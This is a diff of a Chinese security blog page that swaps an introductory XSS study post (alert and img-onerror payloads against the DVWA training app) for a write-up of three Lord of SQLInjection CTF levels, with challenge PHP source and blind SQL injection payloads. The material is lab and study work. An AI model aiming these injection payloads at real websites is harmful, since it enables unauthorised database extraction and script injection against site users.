@@ -99,25 +99,27 @@
 
 
 
-  <meta name="description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
-<meta name="keywords" content="XSS,漏洞学习">
+  <meta name="description" content="iron_golem1234567891011121314151617&amp;lt;?php  include &quot;./config.php&quot;;   login_chk();   $db = dbconnect();   if(preg_match(&apos;/prob|_|\.|\(\)/i&apos;, $_GET[pw])) exit(&quot;No Hack ~_~&quot;);  if(preg_match(&apos;/sleep|be">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS入门总结">
-<meta property="og:url" content="http://yoursite.com/2019/07/24/xss入门总结/index.html">
+<meta property="og:title" content="Lord-of-SQLInjection-Write-Up(三)">
+<meta property="og:url" content="http://yoursite.com/2019/07/31/Lord-of-SQLInjection-Write-Up-三/index.html">
 <meta property="og:site_name" content="Huha&#39;s Blog">
-<meta property="og:description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
+<meta property="og:description" content="iron_golem1234567891011121314151617&amp;lt;?php  include &quot;./config.php&quot;;   login_chk();   $db = dbconnect();   if(preg_match(&apos;/prob|_|\.|\(\)/i&apos;, $_GET[pw])) exit(&quot;No Hack ~_~&quot;);  if(preg_match(&apos;/sleep|be">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-07-24T17:11:36.440Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019073116430387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODA5ODk2,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2019-07-31T08:48:05.513Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS入门总结">
-<meta name="twitter:description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
+<meta name="twitter:title" content="Lord-of-SQLInjection-Write-Up(三)">
+<meta name="twitter:description" content="iron_golem1234567891011121314151617&amp;lt;?php  include &quot;./config.php&quot;;   login_chk();   $db = dbconnect();   if(preg_match(&apos;/prob|_|\.|\(\)/i&apos;, $_GET[pw])) exit(&quot;No Hack ~_~&quot;);  if(preg_match(&apos;/sleep|be">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2019073116430387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODA5ODk2,size_16,color_FFFFFF,t_70">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/24/xss入门总结/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/31/Lord-of-SQLInjection-Write-Up-三/">
 
 
 
@@ -127,7 +129,7 @@
   };
 </script>
 
-  <title>XSS入门总结 | Huha's Blog</title>
+  <title>Lord-of-SQLInjection-Write-Up(三) | Huha's Blog</title>
   
 
 
@@ -354,7 +356,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/24/xss入门总结/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/Lord-of-SQLInjection-Write-Up-三/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Huha">
@@ -371,7 +373,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">XSS入门总结
+          <h1 class="post-title" itemprop="name headline">Lord-of-SQLInjection-Write-Up(三)
 
               
             
@@ -397,24 +399,12 @@
                 
               
 
-              <time title="创建时间：2019-07-24 21:36:54" itemprop="dateCreated datePublished" datetime="2019-07-24T21:36:54+08:00">2019-07-24</time>
+              <time title="创建时间：2019-07-31 16:47:01 / 修改时间：16:48:05" itemprop="dateCreated datePublished" datetime="2019-07-31T16:47:01+08:00">2019-07-31</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-07-25 01:11:36" itemprop="dateModified" datetime="2019-07-25T01:11:36+08:00">2019-07-25</time>
               
             
           </span>
@@ -431,7 +421,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/SQL注入/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a></span>
 
                 
                 
@@ -445,7 +435,7 @@
 
           
           
-             <span id="/2019/07/24/xss入门总结/" class="leancloud_visitors" data-flag-title="XSS入门总结">
+             <span id="/2019/07/31/Lord-of-SQLInjection-Write-Up-三/" class="leancloud_visitors" data-flag-title="Lord-of-SQLInjection-Write-Up(三)">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -476,86 +466,36 @@
       
 
       
-        <h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h3 id="XSS入门介绍"><a href="#XSS入门介绍" class="headerlink" title="XSS入门介绍"></a>XSS入门介绍</h3><p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
-<h3 id="解析器如何工作"><a href="#解析器如何工作" class="headerlink" title="解析器如何工作"></a>解析器如何工作</h3><p>For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a method call inside the script. This happens because the HTML parser runs before the JavaScript parser.</p>
-<ul>
-<li>XSS解析器就是浏览器</li>
-</ul>
-<h3 id="HTML-entities（HTML-实体）"><a href="#HTML-entities（HTML-实体）" class="headerlink" title="HTML entities（HTML 实体）"></a>HTML entities（HTML 实体）</h3><p>HTML中的保留字符（Reserved characters）都会被替换为HTML实体（&lt;&gt;）<br><a href="https://www.w3schools.com/html/html_entities.asp" target="_blank" rel="noopener">https://www.w3schools.com/html/html_entities.asp</a> </p>
-<h3 id="浏览器如何解码（Freebuf博主）"><a href="#浏览器如何解码（Freebuf博主）" class="headerlink" title="浏览器如何解码（Freebuf博主）"></a>浏览器如何解码（Freebuf博主）</h3><p><a href="https://www.freebuf.com/articles/web/10121.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/10121.html</a></p>
-<h3 id="XSS漏洞复现"><a href="#XSS漏洞复现" class="headerlink" title="XSS漏洞复现"></a>XSS漏洞复现</h3><p><a href="http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS" target="_blank" rel="noopener">http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS</a></p>
-<ul>
-<li>&lt; script &gt;标签内的标准弹框语句，不经过数据库存取<br>  alert(1)<br>  alert(“xss”)<br>  alert(/xss/)<br>  alert(‘xss’)</li>
-</ul>
-<ul>
-<li>经过数据库存取<br>  alert(1)<br>  alert(“xss”)<br>  alert(/xss/)<br>  alert(\ ‘xss\ ‘)（mysql插入数据时默认用单引号包围，再包括单引号出现语法错误）</li>
-</ul>
-<ul>
-<li>DOM复现的绕过语句：<br>‘&gt;&lt; img src=# onerror=”alert(‘XSS’)”&gt;&lt;’<br>‘ onclick=alert(/xss/) //<br>‘ onclick=’alert(/xss/)’     # 单引号双引号都没有关系</li>
-<li>注：<br>“    &gt;testLink    “前面的有个单引号，如果没有明显的引号与前面的属性分开，会与前面的属性结合后再自动添加引号（如果是事件类型），所以可以使用“  空格//  ”分隔，或者直接显示用引号包括事件，如上第二种解决方法。</li>
-</ul>
-<h3 id="DVWA安装："><a href="#DVWA安装：" class="headerlink" title="DVWA安装："></a>DVWA安装：</h3><p><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p>
-<h3 id="DVWA靶场游玩攻略（XSS）："><a href="#DVWA靶场游玩攻略（XSS）：" class="headerlink" title="DVWA靶场游玩攻略（XSS）："></a>DVWA靶场游玩攻略（XSS）：</h3><p><a href="https://www.freebuf.com/articles/web/123779.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/123779.html</a><br><a href="https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/" target="_blank" rel="noopener">https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/</a></p>
-<p><strong>DVWA XSS Reflected</strong><br>•    过滤了“&lt; script &gt;”标签，使用大小写，双写， 添加src属性绕过</p>
-<p>•    若采用正则匹配过滤“&lt; script &gt;”，之前方法都行不通，考虑使用其他标签：<br>​    iframe<br>​    input<br>     img<br>​    body<br>​    添加src属性，利用鼠标事件（通用）：<br>​    &lt; IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;<br>​    利用error事件，适用img<br>​    &lt; IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt;</p>
-<p>•    htmlspecialchars( $_GET[ ‘name’ ] );无解</p>
-<p><strong>DVWA XSS Store</strong><br>•    mysqli_real_escape_string()转移字符串（SQL中的特殊字符）：<br>一次转义对SQL命令并无太大影响，数据库会存储未转义前的字符</p>
-<p>•    stripslashes()去除反斜杠</p>
-<p>•    name字段的限制可以通过burp抓包修改</p>
-<p>•    addslashes( $ message ),mysqli_real_escape_string（$ message）,htmlspecialchars( $ message )，多次转义，数据库中的特殊符号带上反斜杠，并且$message中的HTML保留字符被转换为HTML实体，impossible级别</p>
-<p><strong>DVWA DOM XSS</strong><br>•    基于client的XSS漏洞<br>•    the hash symbol(#)不会被服务端接收到（#后面的部分称为fragment）</p>
-<h3 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h3><ul>
-<li>教程：<br><a href="https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1" target="_blank" rel="noopener">https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1</a><br><a href="https://blog.csdn.net/u011781521/article/details/53895363" target="_blank" rel="noopener">https://blog.csdn.net/u011781521/article/details/53895363</a>  </li>
-<li>window10配置静态文件<br><a href="https://blog.csdn.net/cz_devil/article/details/16826647" target="_blank" rel="noopener">https://blog.csdn.net/cz_devil/article/details/16826647</a><br><a href="https://blog.csdn.net/qq_16241043/article/details/54176442" target="_blank" rel="noopener">https://blog.csdn.net/qq_16241043/article/details/54176442</a></li>
-<li>查看Apache启动失败的错误信息：<br>打开cmd，输入：D:\phpStudy\Apache\binhttpd.exe -t 回车，即显示错误信息</li>
-</ul>
-<h2 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h2><p><strong>识别URL上的输入点</strong><br>可控点：&lt; path&gt;&lt; query&gt;&lt; fragement&gt;<br>•    web2.0的URL与传统形式上的差异：更强调明确含义（web2.0url名称与传统URL的映射）<br>•    需要强大的爬虫进行识别<br>•    fragment可能出现在服务端解析中</p>
-<p><strong>进行XSS测试时，可能的输出点</strong></p>
-<p><strong>HTML标签之间</strong></p>
-<ol>
-<li>直接输入js代码</li>
-<li>闭合标签（其他标签无法执行HTML代码）</li>
-</ol>
-<ul>
-<li>注：<br>div<br>pre<br>code<br>这三个标签可以解析HTML代码，不可以解析的标签实际上是进行了htmencode编码</li>
-</ul>
-<p><strong>HTML标签之内（属性）</strong></p>
-<ol start="3">
-<li>利用事件（效果比较差）</li>
-<li>闭合属性，闭合标签（成功率较低）</li>
-<li>特殊属性src/href/action<br>href执行javascript伪协议，过滤//，考虑js字符串的加减乘除<br>onerror(适用img)<br>data伪协议</li>
-</ol>
-<p><strong>成为js代码</strong></p>
-<ol start="6">
-<li>闭合script标签</li>
-<li>绕过变量引用</li>
-</ol>
-<p><strong>HTML与js的自解码与编码函数</strong><br>•    HTML标签内（&lt;&gt;&amp;）</p>
-<ol start="8">
-<li>entity_name：&amp;#xH  &amp;#D（可以去除分号）</li>
-<li>entity_number:&lt;</li>
-<li>使用htmlspecialchars（）主动编码</li>
-</ol>
-<p>•    JS上下文内</p>
-<ol start="11">
-<li>unicode格式：\uH（中文要使用）</li>
-<li>普通的八进制：\65\65 </li>
-<li>普通16进制：\xH</li>
-<li>反斜杠：&#39;,&quot;,&lt;,&gt;</li>
-</ol>
-<p><strong>urlncode编码</strong><br>•    firefox 和 chorm都会默认url编码  ‘“&lt;&gt;这四种字符，#号后面单引号不会编码，但其他字符还是会进行编码<br>•    PHP中$_SERVER[QUERY_STRING]获取urlencode后的内容</p>
-<p><strong>URL编码——利用JS统一编码</strong><br><a href="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2010/02/url_encoding.html</a></p>
-<p><strong>补充：</strong><br>正常unicode格式：\u5487</p>
-<p>escape（）编码后：%u5487<br>escapeURI（）编码后：utf-8方式（三个字节）%E7%A2%94（同样百分号开头）<br>escapeURIComponent（）编码后：类似第二种，所有字符编码</p>
-<ul>
-<li>注：<br>  编码解码函数参数都可以接收unicode字符，<br>  如果是ASCII范围内，结果返回可打印的字符，<br>  如果超出这个范围，编码正常（可能是unicode模式，可能是utf-8形式），解码都是返回相应的字符<br>  思考：<br>  其次，escape()不对”+”编码。但是我们知道，网页在提交表单的时候，如果有空格，则会被转化为+字符。服    务器处理数据的时候，会把+号处理成空格。所以，使用的时候要小心。</li>
-</ul>
-<h3 id="XSS-game"><a href="#XSS-game" class="headerlink" title="XSS game"></a>XSS game</h3><blockquote>
-<p><a href="http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html" target="_blank" rel="noopener">http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html</a></p>
-</blockquote>
-<h3 id="Hack-me"><a href="#Hack-me" class="headerlink" title="Hack me"></a>Hack me</h3><p><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me/</a></p>
-<h3 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h3><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p>
-<h3 id="基于DOM的XSS模糊测试论文（基础打好后再看）"><a href="#基于DOM的XSS模糊测试论文（基础打好后再看）" class="headerlink" title="基于DOM的XSS模糊测试论文（基础打好后再看）"></a>基于DOM的XSS模糊测试论文（基础打好后再看）</h3><p><a href="https://www.hindawi.com/journals/jcnc/2018/8159548/" target="_blank" rel="noopener">https://www.hindawi.com/journals/jcnc/2018/8159548/</a></p>
+        <h2 id="iron-golem"><a href="#iron-golem" class="headerlink" title="iron_golem"></a>iron_golem</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) exit(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/sleep|benchmark/i'</span>, $_GET[pw])) exit(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_iron_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(mysqli_error($db)) exit(mysqli_error($db));</span><br><span class="line">  echo <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_iron_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"iron_golem"</span>);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了延时函数，本来想用基于正则的延时注入，但是过滤了点号（正则中任意匹配的通<br>配符）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit(mysqli_error($db));</span><br></pre></td></tr></table></figure>
+
+<p>程序会进行报错回显，考虑常见的报错回显如updatexml()，但是表名被过滤，无法利用<br>最后使用盲注，在true时因执行(select 1 union select 2)语句而报错</p>
+<p><img src="https://img-blog.csdnimg.cn/2019073116430387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODA5ODk2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在false时返回空，基于此实现盲注脚本</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pw=<span class="number">1</span><span class="string">' or id='</span>admin<span class="string">' and if(ascii(substr((pw),1,1))&gt;80,(select 1 union select 2),1)%23</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="dark-eyes"><a href="#dark-eyes" class="headerlink" title="dark_eyes"></a>dark_eyes</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) exit(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/col|if|case|when|sleep|benchmark/i'</span>, $_GET[pw])) exit(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_dark_eyes where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(mysqli_error($db)) exit();</span><br><span class="line">  echo <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_dark_eyes where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"dark_eyes"</span>);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>原本使用这个payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=1' or id='admin' and substr(pw,1,1)='a' and (select 1 union select 2)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>但是选择表名后一直显示空白，无法进行盲注</p>
+<p>后来看别人的writeup，发现另一种姿势</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span> union select <span class="number">0</span>报错</span><br><span class="line">select <span class="number">1</span> union select <span class="number">1</span>不报错</span><br></pre></td></tr></table></figure>
+
+<p>基于此可以构造盲注</p>
+<h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pw=<span class="number">1</span><span class="string">' or id='</span>admin<span class="string">' and (select 1 union select ascii(substr((pw),1,1))&gt;80)%23</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="hell-fire"><a href="#hell-fire" class="headerlink" title="hell_fire"></a>hell_fire</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|proc|union/i'</span>, $_GET[order])) exit(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id,email,score from prob_hell_fire where 1 order by &#123;$_GET[order]&#125;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;"</span>;</span><br><span class="line">  $rows = mysqli_query($db,$query);</span><br><span class="line">  <span class="keyword">while</span>(($result = mysqli_fetch_array($rows)))&#123;</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">"admin"</span>) $result[<span class="string">'email'</span>] = <span class="string">"**************"</span>;</span><br><span class="line">    echo <span class="string">"&lt;tr&gt;&lt;td&gt;&#123;$result[id]&#125;&lt;/td&gt;&lt;td&gt;&#123;$result[email]&#125;&lt;/td&gt;&lt;td&gt;&#123;$result[score]&#125;&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  echo <span class="string">"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;"</span>;</span><br><span class="line"> </span><br><span class="line">  $_GET[email] = addslashes($_GET[email]);</span><br><span class="line">  $query = <span class="string">"select email from prob_hell_fire where id='admin' and email='&#123;$_GET[email]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'email'</span>]) &amp;&amp; ($result[<span class="string">'email'</span>] === $_GET[<span class="string">'email'</span>])) solve(<span class="string">"hell_fire"</span>);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用order by进行盲注<br>根据if语句true or false返回不同的字段进行排序，确保两个字段排序的结果不同(socre,id,email三个字段排序返回的结果都是一样的，所以选择纯数字字段)</p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=<span class="keyword">if</span>(id=<span class="string">'admin'</span> and ascii(substr(email,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">97</span>,score,<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -579,9 +519,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/XSS/" rel="tag"># XSS</a>
-          
-            <a href="/tags/漏洞学习/" rel="tag"># 漏洞学习</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
         </div>
       
@@ -594,15 +532,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/07/29/Lord-of-SQLInjection-Write-Up-二/" rel="next" title="Lord of SQLInjection Write Up(二)">
+                <i class="fa fa-chevron-left"></i> Lord of SQLInjection Write Up(二)
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/24/RCTF2019 nextphp writeup/" rel="prev" title="RCTF2019 nextphp writeup">
-                RCTF2019 nextphp writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -752,7 +690,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞基础"><span class="nav-number">1.</span> <span class="nav-text">XSS漏洞基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS入门介绍"><span class="nav-number">1.1.</span> <span class="nav-text">XSS入门介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解析器如何工作"><span class="nav-number">1.2.</span> <span class="nav-text">解析器如何工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML-entities（HTML-实体）"><span class="nav-number">1.3.</span> <span class="nav-text">HTML entities（HTML 实体）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器如何解码（Freebuf博主）"><span class="nav-number">1.4.</span> <span class="nav-text">浏览器如何解码（Freebuf博主）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS漏洞复现"><span class="nav-number">1.5.</span> <span class="nav-text">XSS漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA安装："><span class="nav-number">1.6.</span> <span class="nav-text">DVWA安装：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA靶场游玩攻略（XSS）："><span class="nav-number">1.7.</span> <span class="nav-text">DVWA靶场游玩攻略（XSS）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS平台搭建"><span class="nav-number">1.8.</span> <span class="nav-text">XSS平台搭建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞挖掘"><span class="nav-number">2.</span> <span class="nav-text">XSS漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-game"><span class="nav-number">2.1.</span> <span class="nav-text">XSS game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hack-me"><span class="nav-number">2.2.</span> <span class="nav-text">Hack me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSStrike"><span class="nav-number">2.3.</span> <span class="nav-text">XSStrike</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于DOM的XSS模糊测试论文（基础打好后再看）"><span class="nav-number">2.4.</span> <span class="nav-text">基于DOM的XSS模糊测试论文（基础打好后再看）</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#iron-golem"><span class="nav-number">1.</span> <span class="nav-text">iron_golem</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">1.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dark-eyes"><span class="nav-number">2.</span> <span class="nav-text">dark_eyes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#paylaod"><span class="nav-number">2.1.</span> <span class="nav-text">paylaod</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hell-fire"><span class="nav-number">3.</span> <span class="nav-text">hell_fire</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-number">3.1.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></div>
             
 
           </div>
